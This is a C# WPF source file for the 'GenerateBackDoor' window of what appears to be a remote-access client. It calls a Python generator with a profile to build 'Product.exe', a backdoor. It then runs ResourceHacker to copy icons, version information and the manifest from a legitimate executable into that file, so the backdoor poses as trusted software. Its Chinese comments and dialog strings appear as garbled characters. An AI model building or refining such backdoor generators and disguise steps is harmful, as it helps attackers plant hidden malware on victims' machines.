using System;
using System.IO;
using System.Windows;
using Microsoft.Win32;
using System.Diagnostics;

// ���ɺ���
namespace Client
{
    public partial class GenerateBackDoor
    {
        bool selectProfile = false;

        public GenerateBackDoor()
        {
            InitializeComponent();
        }

        // ѡ��Դ��
        private void SelectProfile_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "ѡ�� Profile";
            openFileDialog.Filter = "(*.txt) | *.txt";
            if (Environment.CurrentDirectory.Contains("Client\\bin"))
            {
                openFileDialog.InitialDirectory = Path.GetFullPath(Environment.CurrentDirectory + "\\..\\..\\..\\Shell\\Generator");
            }
            else
            {
                openFileDialog.InitialDirectory = Path.GetFullPath(Environment.CurrentDirectory + "\\..\\Shell\\Generator");
            }
            if ((bool)openFileDialog.ShowDialog())
            {
                selectProfile = true;
                selectProfile_Button.Content = openFileDialog.FileName;
            }
        }

        // ����
        private void Generate_Click(object sender, RoutedEventArgs e)
        {
            string bit = Function.GetRadioResult(bit_WrapPanel);
            if (bit == null)
            {
                MessageBox.Show("δѡ��λ��", "����", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            if (bit == "x86")
            {
                MessageBox.Show("�ݲ�֧�� x86", "����", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            if (!selectProfile)
            {
                MessageBox.Show("δѡ�� Profile", "����", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            // �����������ű�
            string generatorPath = Path.GetDirectoryName(selectProfile_Button.Content.ToString()) + @"\Generator.py";
            if (!File.Exists(generatorPath))
            {
                MessageBox.Show("δ�ҵ� " + generatorPath, "����", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
            try
            {
                ProcessStartInfo processInfo = new ProcessStartInfo
                {
                    FileName = "python",
                    Arguments = "\"" + generatorPath + "\" \"" + selectProfile_Button.Content.ToString() + "\"",
                };
                Process scriptProcess = new Process();
                scriptProcess.StartInfo = processInfo;
                scriptProcess.Start();
                scriptProcess.WaitForExit();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Python δ������������� " + ex.Message, "����", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            string productPath = selectProfile_Button.Content.ToString() + @"\..\tmp\Product.exe";
            if (!File.Exists(productPath))
            {
                MessageBox.Show("δ�ҵ�" + productPath, "����", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }

            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                openFileDialog.Title = "�����Դ (��ѡ��ǿ�ҽ���)��ѡ�� PE �ļ�������Դ��ȡ";
                openFileDialog.Filter = "(*.exe;*.dll) | *.exe;*.dll";
                if (openFileDialog.ShowDialog() == true)
                {
                    string resFilePath = openFileDialog.FileName;
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + productPath + "\" -save \"" + productPath + "\" -res \"" + resFilePath + "\" -action addoverwrite -mask *");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + resFilePath + "\" -save \"tmp\\VERSIONINFO.res\" -action extract -mask VERSIONINFO");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + resFilePath + "\" -save \"tmp\\MANIFEST.res\" -action extract -mask MANIFEST");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + productPath + "\" -save \"" + productPath + "\" -res \"tmp\\VERSIONINFO.res\" -action addoverwrite -mask *");
                    Function.InvokeTool("tools\\ResourceHacker", "-open \"" + productPath + "\" -save \"" + productPath + "\" -res \"tmp\\MANIFEST.res\" -action addoverwrite -mask *");
                }
            }
            catch
            {
                MessageBox.Show("��Դ���ʧ��", "����", MessageBoxButton.OK, MessageBoxImage.Error);
            }

            try
            {
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Title = "ѡ�񱣴�·��";
                saveFileDialog.Filter = "(*.*) | *.*";
                saveFileDialog.FileName = "Product.exe";
                if (saveFileDialog.ShowDialog() == true)
                {
                    if (File.Exists(saveFileDialog.FileName))
                    {
                        File.Delete(saveFileDialog.FileName);
                    }
                    File.Move(productPath, saveFileDialog.FileName);
                    MessageBox.Show("������� ! ! !\n�����ӵ���Դ���³����޷��������������Դ��", "֪ͨ", MessageBoxButton.OK, MessageBoxImage.Information);
                }
                else
                {
                    File.Delete(productPath);
                }
            }
            catch
            {
                MessageBox.Show("����ʧ��", "����", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
    }
}